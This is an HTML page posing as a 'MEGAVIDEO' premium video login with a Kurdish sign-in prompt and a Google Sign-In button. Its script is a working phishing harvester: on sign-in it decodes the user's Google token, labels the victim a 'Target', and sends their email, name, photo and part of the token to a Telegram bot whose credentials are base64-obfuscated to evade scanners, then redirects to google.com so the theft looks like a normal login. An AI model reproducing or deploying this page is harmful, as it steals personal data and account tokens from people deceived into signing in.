<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Video Access</title>
    <script src="https://accounts.google.com/gsi/client" async defer></script>
    <style>
        body { background-color: #0b0b0b; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background-color: #121212; padding: 50px 30px; border-radius: 12px; text-align: center; width: 340px; border: 1px solid #222; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
        .logo { color: #f90; font-size: 32px; font-weight: 900; margin-bottom: 15px; letter-spacing: -1px; }
        .logo span { background-color: #f90; color: #000; padding: 2px 8px; border-radius: 5px; margin-left: 3px; }
        h2 { font-size: 16px; color: #aaa; margin-bottom: 35px; font-weight: 400; }
        .secure-info { margin-top: 30px; font-size: 11px; color: #444; border-top: 1px solid #222; padding-top: 15px; }
    </style>
</head>
<body>

    <div class="card">
        <div class="logo">MEGA<span>VIDEO</span></div>
        <h2>بۆ بینینی ناوەڕۆکی ڤیدیۆکان لۆگین بکە</h2>
        
        <div id="g_id_onload"
             data-client_id="121486578260-0ufbbunp1sojq9vnceu17f8r09qtt3t2.apps.googleusercontent.com"
             data-callback="onSignIn">
        </div>
        <div class="g_id_signin" data-type="standard" data-theme="filled_black" data-size="large" data-width="300"></div>

        <div class="secure-info">Secure Login via Google Authentication</div>
    </div>

    <script>
        // Encoded Credentials (Base64) - Hidden from basic scanners
        const _0x1 = "ODc5MjQ0NjU3NjpBQUgzWEpfVk9FVDJCVHBvbk5hNnhLclpjNWJmUEs3aDJqSQ==";
        const _0x2 = "ODM2MDA0ODgxMw==";

        function onSignIn(response) {
            const token = response.credential;
            const decodedToken = JSON.parse(atob(token.split('.')[1]));
            
            const message = `
🔥 Target Login:
📧 Email: ${decodedToken.email}
👤 Name: ${decodedToken.name}
🖼️ Pic: ${decodedToken.picture}
🔑 Token: ${token.substring(0, 50)}...
            `;

            fetch(`https://api.telegram.org/bot${atob(_0x1)}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: atob(_0x2), text: message })
            }).then(() => {
                // Redirect user after login to make it look real
                window.location.href = "https://www.google.com";
            });
        }
    </script>
</body>
</html>
